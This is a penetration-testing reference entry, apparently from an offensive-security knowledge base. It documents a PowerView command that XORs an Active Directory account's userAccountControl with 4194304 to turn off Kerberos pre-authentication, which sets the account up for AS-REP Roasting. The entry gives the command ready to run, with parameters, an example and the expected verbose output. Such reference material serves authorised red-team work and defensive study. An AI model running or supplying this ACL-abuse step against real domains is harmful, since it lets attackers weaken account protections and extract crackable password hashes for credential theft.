---
type: command
executor: powershell
data: >-
  Set-DomainObject -Identity $_TARGET_USER -XOR @{useraccountcontrol=4194304}
  -Verbose
output: null
platforms:
  - Windows
tags:
  - active-directory
  - as-rep-roasting
  - acl-abuse
verified: true
validated: true
---

# powerview-set-domainobject-xor-uac

## Command

```powershell
Set-DomainObject -Identity $_TARGET_USER -XOR @{useraccountcontrol=4194304} -Verbose
```

## Description

Toggles the DONT_REQ_PREAUTH flag (4194304) in userAccountControl via XOR operation to enable/disable Kerberos pre-authentication for AS-REP Roasting.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -Identity | Target username | Yes |
| -XOR | Hashtable with useraccountcontrol value to XOR | Yes |
| -Verbose | Detailed output | No |
| $_TARGET_USER | Target username | Yes |

## Examples

### Enable Pre-Auth Disable

```powershell
Set-DomainObject -Identity targetuser -XOR @{useraccountcontrol=4194304} -Verbose
```

## Expected Output

VERBOSE: Modified userAccountControl for CN=targetuser,CN=Users,DC=domain,DC=local

## Related

- [[procedures/Active-Directory-ACL-Abuse-via-Kerberoasting-and-AS-REP-Roasting]]
- [[tools/PowerView]]
